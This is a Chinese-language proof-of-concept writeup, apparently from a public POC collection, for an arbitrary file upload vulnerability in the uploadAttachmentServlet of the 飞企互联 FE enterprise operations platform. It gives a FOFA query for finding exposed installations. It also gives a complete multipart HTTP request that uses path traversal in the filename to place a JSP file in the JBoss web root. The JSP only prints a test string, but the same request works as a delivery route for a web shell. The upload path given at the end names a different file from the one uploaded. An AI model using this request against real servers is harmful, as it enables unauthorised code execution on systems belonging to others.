## 飞企互联-FE企业运营管理平台uploadAttachmentServlet存在任意文件上传漏洞

## fofa
```
app="FE-协作平台"
```

访问`/servlet/uploadAttachmentServlet` 出现下面情况说明存在漏洞

![image](https://github.com/wy876/POC/assets/139549762/f6e18f0b-09de-44bc-a9ca-440d92786ee7)


## poc
```
POST /servlet/uploadAttachmentServlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Length: 325

------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/123123.jsp"
Content-Type: text/plain

<% out.println("123123");%>
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="json"

{"iq":{"query":{"UpdateType":"mail"}}}
------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
```
![image](https://github.com/wy876/POC/assets/139549762/b2d253ca-80e4-4cdf-92e6-575b7cd8ba7e)


上传文件地址
`http://127.0.0.1/hello321.jsp;`

## 漏洞来源
- https://mp.weixin.qq.com/s/vRiYsWXKr0R0SKwx_aNYRQ
